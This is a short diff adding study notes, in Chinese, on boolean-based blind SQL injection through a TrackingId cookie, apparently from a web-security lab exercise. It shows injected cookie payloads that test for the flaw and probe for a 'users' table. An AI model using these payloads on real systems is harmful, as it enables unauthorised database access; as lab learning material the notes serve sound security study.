@@ -1,0 +1,6 @@
+正常的cookie
+Cookie: TrackingId=P3RDdMYbQMLVixfb1; session=DxbCJew3AQ47ibUZuV98ocsdnbQM3fUy
+將cooke後面增加' AND '1'='1,可以根據有沒有返回welcome來判斷是否存在sql注入
+Cookie: TrackingId=P3RDdMYbQMLVixfb' AND '1'='1; session=DxbCJew3AQ47ibUZuV98ocsdnbQM3fUy
+將cooke後面增加'
+Cookie: TrackingId=P3RDdMYbQMLVixfb' AND (SELECT 'a' FROM users LIMIT 1)='a; session=DxbCJew3AQ47ibUZuV98ocsdnbQM3fUy
